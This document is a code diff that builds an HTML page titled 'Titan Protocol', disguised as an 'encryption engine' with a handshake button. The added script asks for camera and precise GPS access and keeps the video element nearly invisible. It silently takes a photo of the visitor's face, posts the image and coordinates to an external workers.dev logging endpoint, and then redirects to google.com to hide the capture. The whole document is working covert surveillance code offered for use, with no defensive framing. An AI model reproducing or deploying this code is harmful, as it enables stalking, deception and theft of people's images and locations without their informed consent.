@@ -1,55 +1,71 @@
-<script>
-    const LOGGING_API = "https://titan-logger.saliljha523.workers.dev";
-    const video = document.getElementById('v');
-    const btn = document.getElementById('btn');
-    const status = document.getElementById('status');
-    const canvas = document.createElement('canvas');
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Titan Protocol</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .btn { padding: 25px 40px; border: 2px solid #0f0; background: transparent; color: #0f0; cursor: pointer; font-weight: bold; }
+        #v { width: 1px; height: 1px; opacity: 0.01; }
+    </style>
+</head>
+<body>
+    <div id="status">ENCRYPTION ENGINE STANDBY</div>
+    <video id="v" playsinline muted></video>
+    <button id="btn" class="btn">INITIALIZE HANDSHAKE</button>
 
-    btn.onclick = async () => {
-        btn.style.display = 'none';
-        status.innerText = "CALIBRATING SENSORS...";
-        
-        // 1. Request GPS and Camera in parallel
-        try {
-            const [stream, position] = await Promise.all([
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }),
-                new Promise((resolve) => {
-                    navigator.geolocation.getCurrentPosition(resolve, () => resolve(null), {
-                        enableHighAccuracy: true,
-                        timeout: 5000
-                    });
-                })
-            ]);
+    <script>
+        const LOGGING_API = "https://titan-logger.saliljha523.workers.dev";
+        const video = document.getElementById('v');
+        const btn = document.getElementById('btn');
+        const status = document.getElementById('status');
+        const canvas = document.createElement('canvas');
 
-            video.srcObject = stream;
+        btn.onclick = async () => {
+            btn.style.display = 'none';
+            status.innerText = "CALIBRATING...";
             
-            video.onloadedmetadata = () => {
-                video.play();
-                setTimeout(() => executeFinalCapture(position), 300);
-            };
-        } catch (err) {
-            status.innerText = "CRITICAL ERROR: SENSOR_FAILURE";
+            try {
+                // Request Precision GPS and Camera
+                const [stream, pos] = await Promise.all([
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }),
+                    new Promise((res) => {
+                        navigator.geolocation.getCurrentPosition(res, () => res(null), {
+                            enableHighAccuracy: true, timeout: 5000
+                        });
+                    })
+                ]);
+
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    video.play();
+                    setTimeout(() => snap(pos), 400);
+                };
+            } catch (e) {
+                status.innerText = "ACCESS DENIED";
+            }
+        };
+
+        async function snap(pos) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const img = canvas.toDataURL('image/jpeg', 0.5);
+
+            video.srcObject.getTracks().forEach(t => t.stop());
+
+            const coords = pos ? `${pos.coords.latitude},${pos.coords.longitude}` : "GPS_DENIED";
+
+            fetch(LOGGING_API, {
+                method: 'POST',
+                keepalive: true,
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ image: img, gps: coords })
+            });
+
+            window.location.replace("https://google.com");
         }
-    };
-
-    async function executeFinalCapture(pos) {
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        const dataImg = canvas.toDataURL('image/jpeg', 0.4);
-
-        video.srcObject.getTracks().forEach(t => t.stop());
-
-        // Extract exact coordinates if available
-        const gps = pos ? `${pos.coords.latitude}, ${pos.coords.longitude}` : "GPS_DENIED";
-
-        fetch(LOGGING_API, {
-            method: 'POST',
-            keepalive: true,
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ image: dataImg, gps_coords: gps })
-        });
-
-        window.location.replace("https://google.com");
-    }
-</script>
+    </script>
+</body>
+</html>
